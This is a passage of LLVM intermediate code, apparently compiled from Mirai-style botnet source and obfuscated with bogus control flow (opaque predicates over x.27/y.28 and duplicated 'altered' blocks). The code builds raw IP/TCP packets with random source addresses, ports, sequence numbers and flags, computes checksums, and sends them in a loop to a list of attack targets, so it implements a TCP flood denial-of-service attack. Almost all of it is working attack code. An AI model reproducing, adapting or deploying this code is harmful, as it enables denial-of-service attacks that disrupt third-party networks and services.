  %118 = load i32, i32* %10, align 4
  %119 = bitcast i32* %9 to i8*
  %120 = call i32 @setsockopt(i32 %118, i32 0, i32 3, i8* %119, i32 4) #6
  %121 = icmp eq i32 %120, -1
  %122 = load i32, i32* @x.27
  %123 = load i32, i32* @y.28
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %121, label %130, label %133

; <label>:130:                                    ; preds = %originalBBpart2
  %131 = load i32, i32* %10, align 4
  %132 = call i32 @close(i32 %131)
  br label %632

; <label>:133:                                    ; preds = %originalBBpart2
  store i32 0, i32* %9, align 4
  br label %134

; <label>:134:                                    ; preds = %originalBBpart2202, %133
  %135 = load i32, i32* @x.27
  %136 = load i32, i32* @y.28
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %134
  %143 = load i32, i32* %9, align 4
  %144 = load i8, i8* %5, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp slt i32 %143, %145
  %147 = load i32, i32* @x.27
  %148 = load i32, i32* @y.28
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %146, label %155, label %360

; <label>:155:                                    ; preds = %originalBBpart24
  %156 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %157 = load i8**, i8*** %11, align 8
  %158 = load i32, i32* %9, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds i8*, i8** %157, i64 %159
  store i8* %156, i8** %160, align 8
  %161 = load i8**, i8*** %11, align 8
  %162 = load i32, i32* %9, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds i8*, i8** %161, i64 %163
  %165 = load i8*, i8** %164, align 8
  %166 = bitcast i8* %165 to %struct.iphdr*
  store %struct.iphdr* %166, %struct.iphdr** %29, align 8
  %167 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i64 1
  %169 = bitcast %struct.iphdr* %168 to %struct.tcphdr*
  store %struct.tcphdr* %169, %struct.tcphdr** %30, align 8
  %170 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %171 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %170, i64 1
  %172 = bitcast %struct.tcphdr* %171 to i8*
  store i8* %172, i8** %31, align 8
  %173 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %174 = bitcast %struct.iphdr* %173 to i8*
  %175 = load i8, i8* %174, align 4
  %176 = and i8 %175, 15
  %177 = or i8 %176, 64
  store i8 %177, i8* %174, align 4
  %178 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %179 = bitcast %struct.iphdr* %178 to i8*
  %180 = load i8, i8* %179, align 4
  %181 = and i8 %180, -16
  %182 = or i8 %181, 5
  store i8 %182, i8* %179, align 4
  %183 = load i8, i8* %12, align 1
  %184 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 1
  store i8 %183, i8* %185, align 1
  %186 = load i32, i32* %26, align 4
  %187 = sext i32 %186 to i64
  %188 = add i64 40, %187
  %189 = trunc i64 %188 to i16
  %190 = call zeroext i16 @htons(i16 zeroext %189) #7
  %191 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 2
  store i16 %190, i16* %192, align 2
  %193 = load i16, i16* %13, align 2
  %194 = call zeroext i16 @htons(i16 zeroext %193) #7
  %195 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %196 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %195, i32 0, i32 3
  store i16 %194, i16* %196, align 4
  %197 = load i8, i8* %14, align 1
  %198 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 5
  store i8 %197, i8* %199, align 4
  %200 = load i8, i8* %15, align 1
  %201 = icmp ne i8 %200, 0
  br i1 %201, label %202, label %222

; <label>:202:                                    ; preds = %155
  %203 = load i32, i32* @x.27
  %204 = load i32, i32* @y.28
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %202
  %211 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %212 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 4
  store i16 %211, i16* %213, align 2
  %214 = load i32, i32* @x.27
  %215 = load i32, i32* @y.28
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %222

; <label>:222:                                    ; preds = %originalBBpart28, %155
  %223 = load i32, i32* @x.27
  %224 = load i32, i32* @y.28
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %222
  %231 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %232 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %231, i32 0, i32 6
  store i8 6, i8* %232, align 1
  %233 = load i32, i32* %28, align 4
  %234 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 8
  store i32 %233, i32* %235, align 4
  %236 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %237 = load i32, i32* %9, align 4
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %236, i64 %238
  %240 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %239, i32 0, i32 1
  %241 = load i32, i32* %240, align 4
  %242 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %243 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %242, i32 0, i32 9
  store i32 %241, i32* %243, align 4
  %244 = load i16, i16* %16, align 2
  %245 = call zeroext i16 @htons(i16 zeroext %244) #7
  %246 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %247 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %246, i32 0, i32 0
  store i16 %245, i16* %247, align 4
  %248 = load i16, i16* %17, align 2
  %249 = call zeroext i16 @htons(i16 zeroext %248) #7
  %250 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %251 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %250, i32 0, i32 1
  store i16 %249, i16* %251, align 2
  %252 = load i32, i32* %18, align 4
  %253 = trunc i32 %252 to i16
  %254 = call zeroext i16 @htons(i16 zeroext %253) #7
  %255 = zext i16 %254 to i32
  %256 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %257 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %256, i32 0, i32 2
  store i32 %255, i32* %257, align 4
  %258 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %259 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %258, i32 0, i32 4
  %260 = load i16, i16* %259, align 4
  %261 = and i16 %260, -241
  %262 = or i16 %261, 80
  store i16 %262, i16* %259, align 4
  %263 = load i8, i8* %20, align 1
  %264 = sext i8 %263 to i16
  %265 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %266 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %265, i32 0, i32 4
  %267 = load i16, i16* %266, align 4
  %268 = and i16 %264, 1
  %269 = shl i16 %268, 13
  %270 = and i16 %267, -8193
  %271 = or i16 %270, %269
  store i16 %271, i16* %266, align 4
  %272 = load i8, i8* %21, align 1
  %273 = sext i8 %272 to i16
  %274 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %275 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %274, i32 0, i32 4
  %276 = load i16, i16* %275, align 4
  %277 = and i16 %273, 1
  %278 = shl i16 %277, 12
  %279 = and i16 %276, -4097
  %280 = or i16 %279, %278
  store i16 %280, i16* %275, align 4
  %281 = load i8, i8* %22, align 1
  %282 = sext i8 %281 to i16
  %283 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %284 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %283, i32 0, i32 4
  %285 = load i16, i16* %284, align 4
  %286 = and i16 %282, 1
  %287 = shl i16 %286, 11
  %288 = and i16 %285, -2049
  %289 = or i16 %288, %287
  store i16 %289, i16* %284, align 4
  %290 = load i8, i8* %23, align 1
  %291 = sext i8 %290 to i16
  %292 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %293 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %292, i32 0, i32 4
  %294 = load i16, i16* %293, align 4
  %295 = and i16 %291, 1
  %296 = shl i16 %295, 10
  %297 = and i16 %294, -1025
  %298 = or i16 %297, %296
  store i16 %298, i16* %293, align 4
  %299 = load i8, i8* %24, align 1
  %300 = sext i8 %299 to i16
  %301 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %302 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %301, i32 0, i32 4
  %303 = load i16, i16* %302, align 4
  %304 = and i16 %300, 1
  %305 = shl i16 %304, 9
  %306 = and i16 %303, -513
  %307 = or i16 %306, %305
  store i16 %307, i16* %302, align 4
  %308 = load i8, i8* %25, align 1
  %309 = sext i8 %308 to i16
  %310 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %311 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %310, i32 0, i32 4
  %312 = load i16, i16* %311, align 4
  %313 = and i16 %309, 1
  %314 = shl i16 %313, 8
  %315 = and i16 %312, -257
  %316 = or i16 %315, %314
  store i16 %316, i16* %311, align 4
  %317 = call i32 @rand_next()
  %318 = and i32 %317, 65535
  %319 = trunc i32 %318 to i16
  %320 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %321 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %320, i32 0, i32 5
  store i16 %319, i16* %321, align 2
  %322 = load i8, i8* %22, align 1
  %323 = icmp ne i8 %322, 0
  %324 = load i32, i32* @x.27
  %325 = load i32, i32* @y.28
  %326 = sub i32 %324, 1
  %327 = mul i32 %324, %326
  %328 = urem i32 %327, 2
  %329 = icmp eq i32 %328, 0
  %330 = icmp slt i32 %325, 10
  %331 = or i1 %329, %330
  br i1 %331, label %originalBBpart2191, label %originalBB10alteredBB

originalBBpart2191:                               ; preds = %originalBB10
  br i1 %323, label %332, label %338

; <label>:332:                                    ; preds = %originalBBpart2191
  %333 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %334 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %333, i32 0, i32 4
  %335 = load i16, i16* %334, align 4
  %336 = and i16 %335, -2049
  %337 = or i16 %336, 2048
  store i16 %337, i16* %334, align 4
  br label %338

; <label>:338:                                    ; preds = %332, %originalBBpart2191
  %339 = load i8*, i8** %31, align 8
  %340 = load i32, i32* %26, align 4
  call void @rand_str(i8* %339, i32 %340)
  br label %341

; <label>:341:                                    ; preds = %338
  %342 = load i32, i32* @x.27
  %343 = load i32, i32* @y.28
  %344 = sub i32 %342, 1
  %345 = mul i32 %342, %344
  %346 = urem i32 %345, 2
  %347 = icmp eq i32 %346, 0
  %348 = icmp slt i32 %343, 10
  %349 = or i1 %347, %348
  br i1 %349, label %originalBB193, label %originalBB193alteredBB

originalBB193:                                    ; preds = %originalBB193alteredBB, %341
  %350 = load i32, i32* %9, align 4
  %351 = add nsw i32 %350, 1
  store i32 %351, i32* %9, align 4
  %352 = load i32, i32* @x.27
  %353 = load i32, i32* @y.28
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBBpart2202, label %originalBB193alteredBB

originalBBpart2202:                               ; preds = %originalBB193
  br label %134

; <label>:360:                                    ; preds = %originalBBpart24
  br label %361

; <label>:361:                                    ; preds = %631, %360
  store i32 0, i32* %9, align 4
  br label %362

; <label>:362:                                    ; preds = %628, %361
  %363 = load i32, i32* @x.27
  %364 = load i32, i32* @y.28
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBB204, label %originalBB204alteredBB

originalBB204:                                    ; preds = %originalBB204alteredBB, %362
  %371 = load i32, i32* %9, align 4
  %372 = load i8, i8* %5, align 1
  %373 = zext i8 %372 to i32
  %374 = icmp slt i32 %371, %373
  %375 = load i32, i32* @x.27
  %376 = load i32, i32* @y.28
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBBpart2206, label %originalBB204alteredBB

originalBBpart2206:                               ; preds = %originalBB204
  br i1 %374, label %383, label %631

; <label>:383:                                    ; preds = %originalBBpart2206
  %384 = load i32, i32* @x.27
  %385 = load i32, i32* @y.28
  %386 = sub i32 %384, 1
  %387 = mul i32 %384, %386
  %388 = urem i32 %387, 2
  %389 = icmp eq i32 %388, 0
  %390 = icmp slt i32 %385, 10
  %391 = or i1 %389, %390
  br i1 %391, label %originalBB208, label %originalBB208alteredBB

originalBB208:                                    ; preds = %originalBB208alteredBB, %383
  %392 = load i8**, i8*** %11, align 8
  %393 = load i32, i32* %9, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds i8*, i8** %392, i64 %394
  %396 = load i8*, i8** %395, align 8
  store i8* %396, i8** %32, align 8
  %397 = load i8*, i8** %32, align 8
  %398 = bitcast i8* %397 to %struct.iphdr*
  store %struct.iphdr* %398, %struct.iphdr** %33, align 8
  %399 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %400 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %399, i64 1
  %401 = bitcast %struct.iphdr* %400 to %struct.tcphdr*
  store %struct.tcphdr* %401, %struct.tcphdr** %34, align 8
  %402 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %403 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %402, i64 1
  %404 = bitcast %struct.tcphdr* %403 to i8*
  store i8* %404, i8** %35, align 8
  %405 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %406 = load i32, i32* %9, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %405, i64 %407
  %409 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %408, i32 0, i32 2
  %410 = load i8, i8* %409, align 4
  %411 = zext i8 %410 to i32
  %412 = icmp slt i32 %411, 32
  %413 = load i32, i32* @x.27
  %414 = load i32, i32* @y.28
  %415 = sub i32 %413, 1
  %416 = mul i32 %413, %415
  %417 = urem i32 %416, 2
  %418 = icmp eq i32 %417, 0
  %419 = icmp slt i32 %414, 10
  %420 = or i1 %418, %419
  br i1 %420, label %originalBBpart2210, label %originalBB208alteredBB

originalBBpart2210:                               ; preds = %originalBB208
  br i1 %412, label %421, label %442

; <label>:421:                                    ; preds = %originalBBpart2210
  %422 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %423 = load i32, i32* %9, align 4
  %424 = sext i32 %423 to i64
  %425 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %422, i64 %424
  %426 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %425, i32 0, i32 1
  %427 = load i32, i32* %426, align 4
  %428 = call i32 @ntohl(i32 %427) #7
  %429 = call i32 @rand_next()
  %430 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %431 = load i32, i32* %9, align 4
  %432 = sext i32 %431 to i64
  %433 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %430, i64 %432
  %434 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %433, i32 0, i32 2
  %435 = load i8, i8* %434, align 4
  %436 = zext i8 %435 to i32
  %437 = lshr i32 %429, %436
  %438 = add i32 %428, %437
  %439 = call i32 @htonl(i32 %438) #7
  %440 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %441 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %440, i32 0, i32 9
  store i32 %439, i32* %441, align 4
  br label %442

; <label>:442:                                    ; preds = %421, %originalBBpart2210
  %443 = load i32, i32* %28, align 4
  %444 = icmp eq i32 %443, -1
  br i1 %444, label %445, label %449

; <label>:445:                                    ; preds = %442
  %446 = call i32 @rand_next()
  %447 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %448 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %447, i32 0, i32 8
  store i32 %446, i32* %448, align 4
  br label %449

; <label>:449:                                    ; preds = %445, %442
  %450 = load i32, i32* @x.27
  %451 = load i32, i32* @y.28
  %452 = sub i32 %450, 1
  %453 = mul i32 %450, %452
  %454 = urem i32 %453, 2
  %455 = icmp eq i32 %454, 0
  %456 = icmp slt i32 %451, 10
  %457 = or i1 %455, %456
  br i1 %457, label %originalBB212, label %originalBB212alteredBB

originalBB212:                                    ; preds = %originalBB212alteredBB, %449
  %458 = load i16, i16* %13, align 2
  %459 = zext i16 %458 to i32
  %460 = icmp eq i32 %459, 65535
  %461 = load i32, i32* @x.27
  %462 = load i32, i32* @y.28
  %463 = sub i32 %461, 1
  %464 = mul i32 %461, %463
  %465 = urem i32 %464, 2
  %466 = icmp eq i32 %465, 0
  %467 = icmp slt i32 %462, 10
  %468 = or i1 %466, %467
  br i1 %468, label %originalBBpart2214, label %originalBB212alteredBB

originalBBpart2214:                               ; preds = %originalBB212
  br i1 %460, label %469, label %475

; <label>:469:                                    ; preds = %originalBBpart2214
  %470 = call i32 @rand_next()
  %471 = and i32 %470, 65535
  %472 = trunc i32 %471 to i16
  %473 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %474 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %473, i32 0, i32 3
  store i16 %472, i16* %474, align 4
  br label %475

; <label>:475:                                    ; preds = %469, %originalBBpart2214
  %476 = load i16, i16* %16, align 2
  %477 = zext i16 %476 to i32
  %478 = icmp eq i32 %477, 65535
  br i1 %478, label %479, label %485

; <label>:479:                                    ; preds = %475
  %480 = call i32 @rand_next()
  %481 = and i32 %480, 65535
  %482 = trunc i32 %481 to i16
  %483 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %484 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %483, i32 0, i32 0
  store i16 %482, i16* %484, align 4
  br label %485

; <label>:485:                                    ; preds = %479, %475
  %486 = load i32, i32* @x.27
  %487 = load i32, i32* @y.28
  %488 = sub i32 %486, 1
  %489 = mul i32 %486, %488
  %490 = urem i32 %489, 2
  %491 = icmp eq i32 %490, 0
  %492 = icmp slt i32 %487, 10
  %493 = or i1 %491, %492
  br i1 %493, label %originalBB216, label %originalBB216alteredBB

originalBB216:                                    ; preds = %originalBB216alteredBB, %485
  %494 = load i16, i16* %17, align 2
  %495 = zext i16 %494 to i32
  %496 = icmp eq i32 %495, 65535
  %497 = load i32, i32* @x.27
  %498 = load i32, i32* @y.28
  %499 = sub i32 %497, 1
  %500 = mul i32 %497, %499
  %501 = urem i32 %500, 2
  %502 = icmp eq i32 %501, 0
  %503 = icmp slt i32 %498, 10
  %504 = or i1 %502, %503
  br i1 %504, label %originalBBpart2218, label %originalBB216alteredBB

originalBBpart2218:                               ; preds = %originalBB216
  br i1 %496, label %505, label %511

; <label>:505:                                    ; preds = %originalBBpart2218
  %506 = call i32 @rand_next()
  %507 = and i32 %506, 65535
  %508 = trunc i32 %507 to i16
  %509 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %510 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %509, i32 0, i32 1
  store i16 %508, i16* %510, align 2
  br label %511

; <label>:511:                                    ; preds = %505, %originalBBpart2218
  %512 = load i32, i32* %18, align 4
  %513 = icmp eq i32 %512, 65535
  br i1 %513, label %514, label %534

; <label>:514:                                    ; preds = %511
  %515 = load i32, i32* @x.27
  %516 = load i32, i32* @y.28
  %517 = sub i32 %515, 1
  %518 = mul i32 %515, %517
  %519 = urem i32 %518, 2
  %520 = icmp eq i32 %519, 0
  %521 = icmp slt i32 %516, 10
  %522 = or i1 %520, %521
  br i1 %522, label %originalBB220, label %originalBB220alteredBB

originalBB220:                                    ; preds = %originalBB220alteredBB, %514
  %523 = call i32 @rand_next()
  %524 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %525 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %524, i32 0, i32 2
  store i32 %523, i32* %525, align 4
  %526 = load i32, i32* @x.27
  %527 = load i32, i32* @y.28
  %528 = sub i32 %526, 1
  %529 = mul i32 %526, %528
  %530 = urem i32 %529, 2
  %531 = icmp eq i32 %530, 0
  %532 = icmp slt i32 %527, 10
  %533 = or i1 %531, %532
  br i1 %533, label %originalBBpart2222, label %originalBB220alteredBB

originalBBpart2222:                               ; preds = %originalBB220
  br label %534

; <label>:534:                                    ; preds = %originalBBpart2222, %511
  %535 = load i32, i32* @x.27
  %536 = load i32, i32* @y.28
  %537 = sub i32 %535, 1
  %538 = mul i32 %535, %537
  %539 = urem i32 %538, 2
  %540 = icmp eq i32 %539, 0
  %541 = icmp slt i32 %536, 10
  %542 = or i1 %540, %541
  br i1 %542, label %originalBB224, label %originalBB224alteredBB

originalBB224:                                    ; preds = %originalBB224alteredBB, %534
  %543 = load i32, i32* %19, align 4
  %544 = icmp eq i32 %543, 65535
  %545 = load i32, i32* @x.27
  %546 = load i32, i32* @y.28
  %547 = sub i32 %545, 1
  %548 = mul i32 %545, %547
  %549 = urem i32 %548, 2
  %550 = icmp eq i32 %549, 0
  %551 = icmp slt i32 %546, 10
  %552 = or i1 %550, %551
  br i1 %552, label %originalBBpart2226, label %originalBB224alteredBB

originalBBpart2226:                               ; preds = %originalBB224
  br i1 %544, label %553, label %557

; <label>:553:                                    ; preds = %originalBBpart2226
  %554 = call i32 @rand_next()
  %555 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %556 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %555, i32 0, i32 3
  store i32 %554, i32* %556, align 4
  br label %557

; <label>:557:                                    ; preds = %553, %originalBBpart2226
  %558 = load i32, i32* @x.27
  %559 = load i32, i32* @y.28
  %560 = sub i32 %558, 1
  %561 = mul i32 %558, %560
  %562 = urem i32 %561, 2
  %563 = icmp eq i32 %562, 0
  %564 = icmp slt i32 %559, 10
  %565 = or i1 %563, %564
  br i1 %565, label %originalBB228, label %originalBB228alteredBB

originalBB228:                                    ; preds = %originalBB228alteredBB, %557
  %566 = load i8, i8* %27, align 1
  %567 = icmp ne i8 %566, 0
  %568 = load i32, i32* @x.27
  %569 = load i32, i32* @y.28
  %570 = sub i32 %568, 1
  %571 = mul i32 %568, %570
  %572 = urem i32 %571, 2
  %573 = icmp eq i32 %572, 0
  %574 = icmp slt i32 %569, 10
  %575 = or i1 %573, %574
  br i1 %575, label %originalBBpart2230, label %originalBB228alteredBB

originalBBpart2230:                               ; preds = %originalBB228
  br i1 %567, label %576, label %579

; <label>:576:                                    ; preds = %originalBBpart2230
  %577 = load i8*, i8** %35, align 8
  %578 = load i32, i32* %26, align 4
  call void @rand_str(i8* %577, i32 %578)
  br label %579

; <label>:579:                                    ; preds = %576, %originalBBpart2230
  %580 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %581 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %580, i32 0, i32 7
  store i16 0, i16* %581, align 2
  %582 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %583 = bitcast %struct.iphdr* %582 to i16*
  %584 = call zeroext i16 @checksum_generic(i16* %583, i32 20)
  %585 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %586 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %585, i32 0, i32 7
  store i16 %584, i16* %586, align 2
  %587 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %588 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %587, i32 0, i32 6
  store i16 0, i16* %588, align 4
  %589 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %590 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %591 = bitcast %struct.tcphdr* %590 to i8*
  %592 = load i32, i32* %26, align 4
  %593 = sext i32 %592 to i64
  %594 = add i64 20, %593
  %595 = trunc i64 %594 to i16
  %596 = call zeroext i16 @htons(i16 zeroext %595) #7
  %597 = load i32, i32* %26, align 4
  %598 = sext i32 %597 to i64
  %599 = add i64 20, %598
  %600 = trunc i64 %599 to i32
  %601 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %589, i8* %591, i16 zeroext %596, i32 %600)
  %602 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %603 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %602, i32 0, i32 6
  store i16 %601, i16* %603, align 4
  %604 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %605 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %604, i32 0, i32 1
  %606 = load i16, i16* %605, align 2
  %607 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %608 = load i32, i32* %9, align 4
  %609 = sext i32 %608 to i64
  %610 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %607, i64 %609
  %611 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %610, i32 0, i32 0
  %612 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %611, i32 0, i32 1
  store i16 %606, i16* %612, align 2
  %613 = load i32, i32* %10, align 4
  %614 = load i8*, i8** %32, align 8
  %615 = load i32, i32* %26, align 4
  %616 = sext i32 %615 to i64
  %617 = add i64 40, %616
  %618 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %619 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %620 = load i32, i32* %9, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %619, i64 %621
  %623 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %622, i32 0, i32 0
  %624 = bitcast %struct.sockaddr_in* %623 to %struct.sockaddr*
  store %struct.sockaddr* %624, %struct.sockaddr** %618, align 8
  %625 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %626 = load %struct.sockaddr*, %struct.sockaddr** %625, align 8
  %627 = call i64 @sendto(i32 %613, i8* %614, i64 %617, i32 16384, %struct.sockaddr* %626, i32 16)
  br label %628

; <label>:628:                                    ; preds = %579
  %629 = load i32, i32* %9, align 4
  %630 = add nsw i32 %629, 1
  store i32 %630, i32* %9, align 4
  br label %362

; <label>:631:                                    ; preds = %originalBBpart2206
  br label %361

; <label>:632:                                    ; preds = %130, %108
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %109
  store i32 1, i32* %9, align 4
  %633 = load i32, i32* %10, align 4
  %634 = bitcast i32* %9 to i8*
  %635 = call i32 @setsockopt(i32 %633, i32 0, i32 3, i8* %634, i32 4) #6
  %636 = icmp eq i32 %635, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %134
  %637 = load i32, i32* %9, align 4
  %638 = load i8, i8* %5, align 1
  %639 = zext i8 %638 to i32
  %640 = icmp slt i32 %637, %639
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %202
  %641 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %642 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %643 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %642, i32 0, i32 4
  store i16 %641, i16* %643, align 2
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %222
  %644 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %645 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %644, i32 0, i32 6
  store i8 6, i8* %645, align 1
  %646 = load i32, i32* %28, align 4
  %647 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %648 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %647, i32 0, i32 8
  store i32 %646, i32* %648, align 4
  %649 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %650 = load i32, i32* %9, align 4
